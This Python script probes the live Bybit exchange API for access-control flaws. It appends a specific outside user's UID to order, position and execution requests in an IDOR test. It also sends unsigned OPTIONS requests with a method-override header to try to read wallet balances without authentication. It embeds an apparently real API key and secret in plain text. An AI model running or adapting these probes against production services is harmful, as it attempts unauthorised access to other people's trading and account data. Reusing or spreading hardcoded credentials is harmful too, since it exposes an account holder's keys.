#!/usr/bin/env python3
import subprocess
import time
import hmac
import hashlib
import json

# Configuration
API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

def get_server_time():
    try:
        cmd = ["curl", "-s", f"{BASE_URL}/v5/market/time"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        data = json.loads(result.stdout)
        return int(data['time'])
    except:
        return int(time.time() * 1000)

OFFSET = get_server_time() - int(time.time() * 1000)

def get_signature(payload, api_secret):
    return hmac.new(
        bytes(api_secret, "utf-8"), 
        bytes(payload, "utf-8"), 
        hashlib.sha256
    ).hexdigest()

def send_signed_request(endpoint, params):
    timestamp = str(int(time.time() * 1000) + OFFSET)
    recv_window = "5000"
    
    params_str = "&".join([f"{k}={v}" for k, v in sorted(params.items())])
    sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
    
    signature = get_signature(sign_payload, API_SECRET)
    
    headers = [
        "-H", f"X-BAPI-API-KEY: {API_KEY}",
        "-H", f"X-BAPI-SIGN: {signature}",
        "-H", "X-BAPI-SIGN-TYPE: 2",
        "-H", f"X-BAPI-TIMESTAMP: {timestamp}",
        "-H", f"X-BAPI-RECV-WINDOW: {recv_window}",
        "-H", "Content-Type: application/json"
    ]
    
    full_url = f"{BASE_URL}{endpoint}?{params_str}"
    cmd = ["curl", "-s"] + headers + [full_url]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        return json.loads(result.stdout)
    except:
        return {}

print("="*80)
print("FINAL AUTH CHECK (Mainnet)")
print("="*80)

# 1. IDOR on Orders & Positions
endpoints_to_test = [
    ("/v5/order/history", {"category": "linear", "limit": "1"}),
    ("/v5/position/list", {"category": "linear", "limit": "1"}),
    ("/v5/execution/list", {"category": "linear", "limit": "1"})
]

target_uid = "527465455"

for ep, base_params in endpoints_to_test:
    print(f"\nChecking {ep}...")
    
    # Baseline
    base_res = send_signed_request(ep, base_params)
    if base_res.get('retCode') != 0:
        print(f"  Skipping (Baseline failed: {base_res.get('retCode')})")
        continue
        
    base_dump = json.dumps(base_res.get('result'), sort_keys=True)
    
    # Attack
    attack_params = base_params.copy()
    attack_params['uid'] = target_uid
    
    attack_res = send_signed_request(ep, attack_params)
    attack_dump = json.dumps(attack_res.get('result'), sort_keys=True)
    
    if attack_dump == base_dump:
        print("  ✅ Safe (Param ignored)")
    else:
        print("  🚨 DIFFERENCE FOUND!")
        print(f"  Base: {len(base_dump)} chars")
        print(f"  Attack: {len(attack_dump)} chars")

# 2. HTTP Method Override (Auth Bypass) on Mainnet
print("\n[2] Testing HTTP Method Override on Mainnet")
# Try to access wallet balance WITHOUT signature, but with Override header
# Normal GET should be 401/10003
# OPTIONS + Override should be 200 OK + DATA if vulnerable

cmd_override = [
    "curl", "-s", "-X", "OPTIONS",
    "-H", "X-HTTP-Method-Override: GET",
    f"{BASE_URL}/v5/account/wallet-balance?accountType=UNIFIED"
]

res_ov = subprocess.run(cmd_override, capture_output=True, text=True)
print(f"Status: (check stdout length)")
if len(res_ov.stdout) == 0:
    print("  ✅ Safe (Empty response / CORS only)")
elif "retCode" in res_ov.stdout:
    print(f"  🚨 RESPONSE WITH DATA: {res_ov.stdout[:100]}")
else:
    print(f"  Response: {res_ov.stdout[:100]}")

print("\n" + "="*80)
